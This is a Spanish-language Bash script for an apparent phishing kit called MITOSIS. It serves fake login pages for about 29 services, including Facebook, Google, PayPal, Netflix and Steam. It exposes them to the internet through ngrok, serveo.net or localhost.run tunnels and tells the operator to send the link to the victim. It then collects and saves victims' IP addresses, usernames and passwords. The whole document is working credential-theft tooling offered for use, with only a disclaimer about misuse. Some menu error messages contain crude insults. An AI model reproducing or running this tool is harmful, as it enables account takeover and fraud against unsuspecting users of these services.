trap 'printf "\n";stop;exit 1' 2
deps() {
command -v php > /dev/null 2>&1 || { echo >&2 "PHP no esta instalado ! instalalo."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "Curl no esta instalado ! instalalo."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "Openssh no esta instalado ! instalalo"; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip no esta instalado ! instalalo"; exit 1; }
}
banner() {
clear

printf "     \e[1;97m                               \n"   
printf "    ╔═╗╔═╗╔══╗╔════╗╔═══╗╔═══╗╔══╗╔═══╗\n"
printf "    ║║╚╝║║╚╣─╝║╔╗╔╗║║╔═╗║║╔═╗║╚╣─╝║╔═╗║\n"
printf "    ║╔╗╔╗║─║║─╚╝║║╚╝║║─║║║╚══╗─║║─║╚══╗\n"
printf "    ║║║║║║─║║───║║──║║─║║╚══╗║─║║─╚══╗║\n"
printf "    ║║║║║║╔╣─╗──║║──║╚═╝║║╚═╝║╔╣─╗║╚═╝║\n"
printf "    ╚╝╚╝╚╝╚══╝──╚╝──╚═══╝╚═══╝╚══╝╚═══╝v2.1\n" 
printf "     \e[1;31m\e[0m No me hago cargo del mal uso que se le pueda dar a esta herramienta\e[1;31m \n"
printf "     \e[1;97m\e[0m                 indigo    \e[1;97m \n"
}
menu() {
printf " \e[0m[\e[0m\e[0m01\e[0m\e[0m]\e[0m\e[0m Facebook    \e[0m\e[0m[\e[0m\e[0m11\e[0m\e[0m]\e[0m\e[0m Twitch      \e[0m\e[0m[\e[0m\e[0m21\e[0m\e[0m]\e[0m\e[0m DeviantArt\e[0m\n"
printf " \e[0m[\e[0m\e[0m02\e[0m\e[0m]\e[0m\e[0m Instagram   \e[0m\e[0m[\e[0m\e[0m12\e[0m\e[0m]\e[0m\e[0m Pinterest   \e[0m\e[0m[\e[0m\e[0m22\e[0m\e[0m]\e[0m\e[0m Badoo\e[0m\n"
printf " \e[0m[\e[0m\e[0m03\e[0m\e[0m]\e[0m\e[0m Google      \e[0m\e[0m[\e[0m\e[0m13\e[0m\e[0m]\e[0m\e[0m Snapchat    \e[0m\e[0m[\e[0m\e[0m23\e[0m\e[0m]\e[0m\e[0m Origin\e[0m\n"
printf " \e[0m[\e[0m\e[0m04\e[0m\e[0m]\e[0m\e[0m Microsoft   \e[0m\e[0m[\e[0m\e[0m14\e[0m\e[0m]\e[0m\e[0m Linkedin    \e[0m\e[0m[\e[0m\e[0m24\e[0m\e[0m]\e[0m\e[0m CryptoCoin\e[0m\n"
printf " \e[0m[\e[0m\e[0m05\e[0m\e[0m]\e[0m\e[0m Netflix     \e[0m\e[0m[\e[0m\e[0m15\e[0m\e[0m]\e[0m\e[0m Ebay        \e[0m\e[0m[\e[0m\e[0m25\e[0m\e[0m]\e[0m\e[0m Yahoo\e[0m\n"
printf " \e[0m[\e[0m\e[0m06\e[0m\e[0m]\e[0m\e[0m Paypal      \e[0m\e[0m[\e[0m\e[0m16\e[0m\e[0m]\e[0m\e[0m Dropbox     \e[0m\e[0m[\e[0m\e[0m26\e[0m\e[0m]\e[0m\e[0m Wordpress\e[0m\n"
printf " \e[0m[\e[0m\e[0m07\e[0m\e[0m]\e[0m\e[0m Steam       \e[0m\e[0m[\e[0m\e[0m17\e[0m\e[0m]\e[0m\e[0m Protonmail  \e[0m\e[0m[\e[0m\e[0m27\e[0m\e[0m]\e[0m\e[0m Yandex\e[0m\n"
printf " \e[0m[\e[0m\e[0m08\e[0m\e[0m]\e[0m\e[0m Twitter     \e[0m\e[0m[\e[0m\e[0m18\e[0m\e[0m]\e[0m\e[0m Spotify     \e[0m\e[0m[\e[0m\e[0m28\e[0m\e[0m]\e[0m\e[0m StackoverFlow\e[0m\n"
printf " \e[0m[\e[0m\e[0m09\e[0m\e[0m]\e[0m\e[0m Playstation \e[0m\e[0m[\e[0m\e[0m19\e[0m\e[0m]\e[0m\e[0m Reddit      \e[0m\e[0m[\e[0m\e[0m29\e[0m\e[0m]\e[0m\e[0m Vk\e[0m\n"
printf " \e[0m[\e[0m\e[0m10\e[0m\e[0m]\e[0m\e[0m Github      \e[0m\e[0m[\e[0m\e[0m20\e[0m\e[0m]\e[0m\e[0m Adobe       \e[0m\e[0m[\e[0m\e[0mx\e[0m\e[0m] \e[0m\e[0mExit\e[0m\n"
printf "\e[0m\n"
read -p $' \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m Elige una opcion: \e[0m\e[0m\en' option
if [[ $option == 1 || $option == 01 ]]; then
facebook
elif [[ $option == 2 || $option == 02 ]]; then
instagram
elif [[ $option == 3 || $option == 03 ]]; then
gmail
elif [[ $option == 4 || $option == 04 ]]; then
server="microsoft"
start
elif [[ $option == 5 || $option == 05 ]]; then
server="netflix"
start
elif [[ $option == 6 || $option == 06 ]]; then
server="paypal"
start
elif [[ $option == 7 || $option == 07 ]]; then
server="steam"
start
elif [[ $option == 8 || $option == 08 ]]; then
server="twitter"
start
elif [[ $option == 9 || $option == 09 ]]; then
server="playstation"
start
elif [[ $option == 10 ]]; then
server="github"
start
elif [[ $option == 11 ]]; then
server="twitch"
start
elif [[ $option == 12 ]]; then
server="pinterest"
start
elif [[ $option == 13 ]]; then
server="snapchat"
start
elif [[ $option == 14 ]]; then
server="linkedin"
start
elif [[ $option == 15 ]]; then
server="ebay"
start
elif [[ $option == 16 ]]; then
server="dropbox"
start
elif [[ $option == 17 ]]; then
server="protonmail"
start
elif [[ $option == 18 ]]; then
server="spotify"
start
elif [[ $option == 19 ]]; then
server="reddit"
start
elif [[ $option == 20 ]]; then
server="adobe"
start
elif [[ $option == 21 ]]; then
server="deviantart"
start
elif [[ $option == 22 ]]; then
server="badoo"
start
elif [[ $option == 23 ]]; then
server="origin"
start
elif [[ $option == 24 ]]; then
server="cryptocoinsniper"
start
elif [[ $option == 25 ]]; then
server="yahoo"
start
elif [[ $option == 26 ]]; then
server="wordpress"
start
elif [[ $option == 27 ]]; then
server="yandex"
start
elif [[ $option == 28 ]]; then
server="stackoverflow"
start
elif [[ $option == 29 ]]; then
vk
elif [[ $option == X || $option == x ]]; then
exit 1
else
printf " \e[0m[\e[0m\e[0m!\e[0m\e[0m]\e[0m\e[0m opcion invalida como michetti \e[0m[\e[0m\e[0m!\e[0m\e[0m]\e[0m\n"
sleep 1
banner
menu
fi
}
facebook(){
printf " \n"
printf " \e[0m[\e[0m\e[0m01\e[0m\e[0m]\e[0m\e[0m pagina de inicio de sesion \e[0m\n"
printf " \e[0m[\e[0m\e[0m02\e[0m\e[0m]\e[0m\e[0m encuesta facebook Page \e[0m\n"
printf " \e[0m[\e[0m\e[0m03\e[0m\e[0m]\e[0m\e[0m pagina falsa de inicio de sesion de seguridad \e[0m\n"
printf " \e[0m[\e[0m\e[0m04\e[0m\e[0m]\e[0m\e[0m Inicio de sesion messenger \e[0m\n"
printf "\e[0m\n"
read -p $' \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m selecciona una opcion \e[0m\e[0m\en' option
if [[ $option == 1 || $option == 01 ]]; then
server="facebook"
start
elif [[ $option == 2 || $option == 02 ]]; then
server="fb_advanced"
start
elif [[ $option == 3 || $option == 03 ]]; then
server="fb_security"
start
elif [[ $option == 4 || $option == 04 ]]; then
server="fb_messenger"
start
else
printf " \e[0m[\e[0m\e[0m!\e[0m\e[0m]\e[0m\e[0m Invalid option \e[0m[\e[0m\e[0m!\e[0m\e[0m]\e[0m\n"
sleep 1
banner
menu
fi
}
instagram(){
printf " \n"
printf " \e[0m[\e[0m\e[0m01\e[0m\e[0m]\e[0m\e[0m pagina tradicional de inicio de sesion \e[0m\n"
printf " \e[0m[\e[0m\e[0m02\e[0m\e[0m]\e[0m\e[0m pagina de autofollowers \e[0m\n"
printf " \e[0m[\e[0m\e[0m03\e[0m\e[0m]\e[0m\e[0m solicitud de el tick azul \e[0m\n"
printf "\e[0m\n"
read -p $' \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m selecciona una opcion \e[0m\e[0m\en' option
if [[ $option == 1 || $option == 01 ]]; then
server="instagram"
start
elif [[ $option == 2 || $option == 02 ]]; then
server="ig_followers"
start
elif [[ $option == 3 || $option == 03 ]]; then
server="ig_verify"
start
else
printf " \e[0m[\e[0m\e[0m!\e[0m\e[0m]\e[0m\e[0m opcion invalida escribi bien puto \e[0m[\e[0m\e[0m!\e[0m\e[0m]\e[0m\n"
sleep 1
banner
menu
fi
}
gmail(){
printf " \n"
printf " \e[0m[\e[0m\e[0m01\e[0m\e[0m]\e[0m\e[0m inicio de sesion pagina vieja\e[0m\n"
printf " \e[0m[\e[0m\e[0m02\e[0m\e[0m]\e[0m\e[0m inicio de sesion pagina nueva\e[0m\n"
printf " \e[0m[\e[0m\e[0m03\e[0m\e[0m]\e[0m\e[0m Advanced Voting Poll\e[0m\n"
printf "\e[0m\n"
read -p $' \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m selecciona una opcion: \e[0m\e[0m\en' option
if [[ $option == 1 || $option == 01 ]]; then
server="google"
start
elif [[ $option == 2 || $option == 02 ]]; then
server="google_new"
start
elif [[ $option == 3 || $option == 03 ]]; then
server="google_poll"
start
else
printf " \e[0m[\e[0m\e[0m!\e[0m\e[0m]\e[0m\e[0m opcion invalida escribi bien gordo \e[0m[\e[0m\e[0m!\e[0m\e[0m]\e[0m\n"
sleep 1
banner
menu
fi
}
vk(){
printf " \n"
printf " \e[0m[\e[0m\e[0m01\e[0m\e[0m]\e[0m\e[0m Traditional Login Page\e[0m\n"
printf " \e[0m[\e[0m\e[0m02\e[0m\e[0m]\e[0m\e[0m Advanced Voting Poll Login Page\e[0m\n"
printf "\e[0m\n"
read -p $' \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m seleciona una opcion \e[0m\e[0m\en' option
if [[ $option == 1 || $option == 01 ]]; then
server="vk"
start
elif [[ $option == 2 || $option == 02 ]]; then
server="vk_poll"
start
else
printf " \e[0m[\e[0m\e[0m!\e[0m\e[0m]\e[0m\e[0m que pete escribi bien, opcion invalida \e[0m[\e[0m\e[0m!\e[0m\e[0m]\e[0m\n"
sleep 1
banner
menu
fi
}
stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e linksender ]]; then
rm -rf linksender
fi
}
start() {
if [[ -e linksender ]]; then
rm -rf linksender
fi
printf "\n"
printf " \e[0m[\e[0m\e[0m01\e[0m\e[0m]\e[0m\e[0m LocalHost\e[0m\n"
printf " \e[0m[\e[0m\e[0m02\e[0m\e[0m]\e[0m\e[0m Ngrok.io\e[0m\n"
printf " \e[0m[\e[0m\e[0m03\e[0m\e[0m]\e[0m\e[0m Serveo.net\e[0m\n"
printf " \e[0m[\e[0m\e[0m04\e[0m\e[0m]\e[0m\e[0m Localhost.run\e[0m\n"
d_o_server="2"
printf "\n"
read -p $' \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m selecciona uno: \e[0m\e[0m\en' option_server
option_server="${option_server:-${d_o_server}}"
if [[ $option_server == 3 || $option_server == 03 ]]; then
start_s
elif [[ $option_server == 2 || $option_server == 02 ]]; then
start_n
elif [[ $option_server == 4 || $option_server == 04 ]]; then
start_local
elif [[ $option_server == 1 || $option_server == 01 ]]; then
start_l
else
printf " \e[0m[\e[0m\e[0m!\e[0m\e[0m]\e[0m\e[0m opcion invalida \e[0m[\e[0m\e[0m!\e[0m\e[0m]\e[0m\n"
sleep 1
banner
start
fi
}
start_s() {
if [[ -e websites/$server/ip.txt ]]; then
rm -rf websites/$server/ip.txt
fi
if [[ -e websites/$server/usernames.txt ]]; then
rm -rf websites/$server/usernames.txt
fi
def_port="5555"
printf "\e[0m\n"
printf ' \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m selecciona un puerto (Default:\e[0m\e[0m %s \e[0m\e[0m): \e[0m\e[0m' $def_port
read port
port="${port:-${def_port}}"
start_serveo
}
start_serveo() {
printf "\e[0m\n"
printf " \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m iniciando...\e[0m\e[0m(\e[0m\e[0mlocalhost:$port\e[0m\e[0m)\e[0m\n"
cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[0m\n"
printf " \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m lanzando serveo..\e[0m\n"
if [[ -e linksender ]]; then
rm -rf linksender
fi
printf ' \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m N copia y pega esto en una nueva terminal: ssh -R 80:localhost:'$port' serveo.net \e[0m\e[0m %s \n' 
printf
printf
printf
printf ' \e[1m[\e[1m\e[1m~\e[1m\e[1m]\e[1m\e[1m ssh -R 80:localhost:'$port' serveo.net \e[1m\e[1m %s \n'
printf
printf
printf ' \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m Para poner un subdominio personalizado copia y cambia la palabra "indigo" por el subdominio que quieras: \e[0m\e[0m %s \n'
printf
printf ' \e[1m[\e[1m\e[1m~\e[1m\e[1m]\e[1m\e[1m ssh -R indigo:80:localhost:'$port' serveo.net \e[1m\e[1m %s \n'

printf "\n"
found
}
start_n() {
if [[ -e websites/$server/ip.txt ]]; then
rm -rf websites/$server/ip.txt
fi
if [[ -e websites/$server/usernames.txt ]]; then
rm -rf websites/$server/usernames.txt
fi
if [[ -e ngrok ]]; then
echo ""
else
printf "\e[0m\n"
printf " \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m Initializing...\e[0m\e[0m(\e[0m\e[0mlocalhost:5555\e[0m\e[0m)\e[0m\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf " \e[0m[\e[0m\e[0m!\e[0m\e[0m]\e[0m\e[0m Error \e[0m[\e[0m\e[0m!\e[0m\e[0m]\e[0m\e[0m Please Install All Packges.\e[0m\n"
exit 1
fi
else
curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf " \e[0m[\e[0m\e[0m!\e[0m\e[0m]\e[0m\e[0m Error \e[0m[\e[0m\e[0m!\e[0m\e[0m]\e[0m\e[0m Please Install All Packges.\e[0m\n"
exit 1
fi
fi
fi
printf "\e[0m\n"
printf " \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m Launching Ngrok ..\e[0m\n"
cd websites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
sleep 2
./ngrok http 5555 > /dev/null 2>&1 &
sleep 10
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf " \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m Send the link to victim :\e[0m\e[0m %s \n" $link
found
}
start_local(){
def_port="5555"
printf "\e[0m\n"
printf ' \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m selecciona un puerto (Default:\e[0m\e[0m %s \e[0m\e[0m): \e[0m\e[0m' $def_port
read port
port="${port:-${def_port}}"
printf "\e[0m\n"
printf " \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m Initializing...\e[0m\e[0m(\e[0m\e[0mlocalhost:$port\e[0m\e[0m)\e[0m\n"
cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[0m\n"
printf " \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m Launching LocalHostRun ..\e[0m\n"
printf "\n"
if [[ -e linksender ]]; then
rm -rf linksender
fi
printf " \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m Ctrl + C to view Login Info.Press it After the Victim Opened It.\e[0m\n"
printf "\e[0m\n"
ssh -R 80:localhost:$port ssh.localhost.run 2>&1
printf "\e[0m\n"
printf "\n"
printf " \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m Login Info..\e[0m\n"
while [ true ]; do
if [[ -e "websites/$server/ip.txt" ]]; then
c_ip
rm -rf websites/$server/ip.txt
fi
sleep 0.75
if [[ -e "websites/$server/usernames.txt" ]]; then
account=$(grep -o 'Username:.*' websites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' websites/$server/usernames.txt | cut -d ":" -f2)
printf " \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m Account:\e[0m\e[0m %s\n\e[0m" $account
printf " \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m Password:\e[0m\e[0m %s\n\e[0m" $password
cat websites/$server/usernames.txt >> websites/$server/login_info.txt
printf "\e[0m\n"
printf " \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m Saved:\e[0m\e[0m websites/%s/login_info.txt\e[0m\n" $server
printf "\n"
printf " \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m Press Ctrl + C para salir.\e[0m\n"
rm -rf websites/$server/usernames.txt
fi
sleep 0.75
done
}
start_l() {
def_port="5555"
printf "\e[0m\n"
printf ' \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m selecciona un puerto (Default:\e[0m\e[0m %s \e[0m\e[0m): \e[0m\e[0m' $def_port
read port
port="${port:-${def_port}}"
printf "\e[0m\n"
printf " \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m iniciando...\e[0m\e[0m(\e[0m\e[0mlocalhost:$port\e[0m\e[0m)\e[0m\n"
cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[0m\n"
printf " \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m Hosteado de forma exitsa :\e[0m\e[0m http://localhost:$port\e[0m\n"
printf "\n"
found
}
found() {
printf "\n"
printf " \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m esperando por mas datos,\e[0m\e[0m Ctrl + C para salir.\e[0m\n"
printf "\n"
while [ true ]; do
if [[ -e "websites/$server/ip.txt" ]]; then
printf "\n"
printf " \e[0m[\e[0m\e[0m*\e[0m\e[0m]\e[0m\e[0m ip de la victima encontrada!\n"
printf "\n"
c_ip
rm -rf websites/$server/ip.txt
fi
sleep 0.75
if [[ -e "websites/$server/usernames.txt" ]]; then
printf " \e[0m[\e[0m\e[0m*\e[0m\e[0m]\e[0m\e[0m datos de inicio de sesion encontrados!!\n"
printf "\n"
c_cred
rm -rf websites/$server/usernames.txt
fi
sleep 0.75
done
}
c_ip() {
touch websites/$server/login_info.txt
ip=$(grep -a 'IP:' websites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' websites/$server/ip.txt | cut -d '"' -f2)
printf " \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m Ip de la victima:\e[0m\e[0m %s\e[0m\n" $ip
printf "\e[0m\n"
printf " \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m Guardado:\e[0m\e[0m websites/%s/victim_ip.txt\e[0m\n" $server
printf "\n"
cat websites/$server/ip.txt >> websites/$server/victim_ip.txt
}
c_cred() {
account=$(grep -o 'Usuario:.*' websites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'contraseña:.*' websites/$server/usernames.txt | cut -d ":" -f2)
printf " \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m Account:\e[0m\e[0m %s\n\e[0m" $account
printf " \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m Password:\e[0m\e[0m %s\n\e[0m" $password
cat websites/$server/usernames.txt >> websites/$server/login_info.txt
printf "\e[0m\n"
printf " \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m Saved:\e[0m\e[0m websites/%s/login_info.txt\e[0m\n" $server
printf "\n"
printf " \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m esperando por mas datos,\e[0m\e[0m Ctrl + C para salir.\e[0m\n"
}
banner
deps
menu
